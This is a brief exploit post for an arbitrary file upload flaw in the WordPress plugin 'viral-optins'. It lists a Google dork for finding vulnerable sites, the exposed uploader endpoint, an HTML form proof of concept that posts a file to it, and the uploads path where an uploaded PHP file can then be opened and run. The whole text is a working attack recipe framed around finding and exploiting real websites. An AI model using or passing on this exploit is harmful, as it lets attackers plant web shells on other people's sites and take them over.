1) [!] Search target with Google Dorking

" inurl:/wp-content/plugins/viral-optins/ "

2) [!] Exploit the websites

https://localhost/wp-content/plugins/viral-optins/api/uploader/file-uploader.php
Vulnerability? Page Blank!

3) [!] Proof of concept (PoC)

<form method="POST" action="https://localhost/wp-content/plugins/viral-optins/api/uploader/file-uploader.php" enctype="multipart/form-data">
<input type="file" name="Filedata" />
<button>Upload!</button><br/>
</form>

4) [!] Result file access.

https://localhost/wp-content/uploads/YYYY/MM/your-file.php